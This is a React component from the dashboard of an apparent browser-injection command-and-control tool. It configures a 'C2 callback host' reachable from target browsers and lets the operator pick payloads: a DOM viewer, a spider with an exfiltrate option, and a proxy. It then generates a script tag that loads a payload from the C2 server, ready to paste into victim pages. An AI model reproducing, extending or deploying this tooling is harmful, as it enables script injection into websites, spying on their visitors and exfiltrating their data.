import { useState, useEffect } from "react";
import { toast } from "sonner";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Tooltip, TooltipTrigger, TooltipContent } from "@/components/ui/tooltip";
import { Check, Copy, Info } from "lucide-react";
import { AVAILABLE_PAYLOADS, getPayloadLabel, DEFAULT_SPIDER_CONFIG } from "@/lib/constants";
import type { SpiderConfig } from "@/types/api";
import { SpiderConfigFields } from "@/components/dashboard/SpiderConfigFields";

interface CreateLinkFormProps {
  onCreated: () => void;
  /** Called after a link is successfully created, to close the parent dialog. */
  onClose?: () => void;
  c2Url?: string;
}

export function CreateLinkForm({ onCreated, onClose, c2Url }: CreateLinkFormProps) {
  const [serverAddr, setServerAddr] = useState(c2Url ?? window.location.origin);

  // Sync when c2Url prop arrives from async config fetch
  useEffect(() => {
    if (c2Url) setServerAddr(c2Url);
  }, [c2Url]);

  const [selected, setSelected] = useState<Record<string, boolean>>({
    domviewer: true,
    spider: false,
    proxy: false,
  });
  const [spiderConfig, setSpiderConfig] = useState<SpiderConfig>(DEFAULT_SPIDER_CONFIG);
  const [redirectUri, setRedirectUri] = useState("");
  const [creating, setCreating] = useState(false);
  const [scriptTag, setScriptTag] = useState<string | null>(null);
  const [copied, setCopied] = useState(false);

  const toggle = (name: string) =>
    setSelected((s) => ({ ...s, [name]: !s[name] }));

  async function handleCreate() {
    const payloads = AVAILABLE_PAYLOADS.filter((p) => selected[p]);

    const config: Record<string, unknown> = {};
    if (selected.spider) {
      config.spider = {
        exfiltrate: spiderConfig.exfiltrate,
        limitTypes: spiderConfig.limitTypes,
        maxFileSize: spiderConfig.maxFileSize,
        ...(spiderConfig.seed?.trim() ? { seed: spiderConfig.seed.trim() } : {}),
      };
    }

    setCreating(true);
    try {
      const res = await fetch("/api/links", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          payloads,
          ...(redirectUri.trim() ? { redirectUri: redirectUri.trim() } : {}),
          config,
        }),
      });
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      const data = await res.json();
      const base = serverAddr.replace(/\/+$/, "");
      const tag = `<script src="${base}/payload.js/${data.id}"><\/script>`;
      setScriptTag(tag);

      let autoCopied = false;
      try {
        await navigator.clipboard.writeText(tag);
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
        autoCopied = true;
      } catch {
        // clipboard may not be available
      }

      toast.success("Link created", {
        description: autoCopied ? "Script tag copied to clipboard" : undefined,
      });
      onCreated();
      onClose?.();
    } catch (e) {
      toast.error("Failed to create link", {
        description: e instanceof Error ? e.message : undefined,
      });
    } finally {
      setCreating(false);
    }
  }

  return (
    <div className="space-y-4">
      <div className="space-y-1">
        <Label className="flex items-center gap-1 text-sm font-medium">
          C2 Callback Host
          <Tooltip>
            <TooltipTrigger asChild>
              <Info className="h-3.5 w-3.5 text-muted-foreground cursor-help" />
            </TooltipTrigger>
            <TooltipContent>
              The address clients will use to connect back to the C2 server. Should be reachable from target browsers.
            </TooltipContent>
          </Tooltip>
        </Label>
        <Input
          placeholder="http://yourserver:3001"
          value={serverAddr}
          onChange={(e) => setServerAddr(e.target.value)}
        />
      </div>
      <div className="space-y-1">
        <Label className="flex items-center gap-1 text-sm font-medium">
          Redirect URI
          <Tooltip>
            <TooltipTrigger asChild>
              <Info className="h-3.5 w-3.5 text-muted-foreground cursor-help" />
            </TooltipTrigger>
            <TooltipContent>
              The URL to display in the iframe after injection. If empty, the payload will use the page's origin.
            </TooltipContent>
          </Tooltip>
        </Label>
        <Input
          placeholder="(optional — defaults to page origin)"
          value={redirectUri}
          onChange={(e) => setRedirectUri(e.target.value)}
        />
      </div>
      <div className="space-y-2">
        {AVAILABLE_PAYLOADS.map((name) => (
          <div key={name}>
            <label className="flex items-center gap-2 text-sm">
              <input
                type="checkbox"
                checked={selected[name] ?? false}
                onChange={() => toggle(name)}
                className="accent-primary"
              />
              {getPayloadLabel(name)}
            </label>
            {name === "spider" && selected.spider && (
              <SpiderConfigFields
                config={spiderConfig}
                onChange={setSpiderConfig}
                sizeUnit="bytes"
              />
            )}
          </div>
        ))}
      </div>
      <Button onClick={handleCreate} disabled={creating} size="sm">
        {creating ? "Creating..." : "Create Link"}
      </Button>
      {scriptTag && (
        <div className="relative">
          <pre className="bg-muted p-3 rounded-md text-xs overflow-x-auto pr-10">
            {scriptTag}
          </pre>
          <button
            className="absolute top-2 right-2 p-1 rounded hover:bg-accent"
            onClick={async () => {
              try {
                await navigator.clipboard.writeText(scriptTag);
                setCopied(true);
                setTimeout(() => setCopied(false), 2000);
              } catch {}
            }}
          >
            {copied ? (
              <Check className="h-4 w-4 text-green-600" />
            ) : (
              <Copy className="h-4 w-4 text-muted-foreground" />
            )}
          </button>
        </div>
      )}
    </div>
  );
}
